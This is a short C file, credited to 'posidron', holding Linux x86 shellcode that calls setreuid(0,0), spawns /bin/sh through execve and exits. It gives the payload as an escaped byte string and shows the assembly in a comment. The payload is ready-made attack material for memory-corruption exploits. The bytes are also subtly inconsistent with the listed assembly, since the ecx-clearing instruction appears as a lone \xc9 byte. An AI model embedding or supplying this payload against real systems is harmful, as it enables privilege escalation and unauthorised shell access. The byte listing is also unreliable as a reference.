/*
***********************************************************
* Author: posidron (www.tripbit.org)
*
* Description: Linux setreuid(); shellcode for x86 arch.
*              setreuid(0,0); execve /bin/sh; exit(0);
***********************************************************
*/

char setreuid[] =  "\x31\xc0\x31\xdb\xc9\xb0\x46\xcd\x80\x31"
		               "\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
		               "\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b"
                   "\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80";

/*
xor %eax, %eax
xor %ebx, %ebx
xor %ecx, %ecx
mov $0x46, %al
int  $0x80

xor %eax, %eax
push %eax
push $0x68732f2f
push $0x6e69622f
mov %esp, %ebx
push %eax
push %ebx
mov %esp, %ecx
mov $0xb,%al
int $0x80

xor %eax, %eax
xor %ebx, %ebx
mov $0x1, %al
int $0x80
*/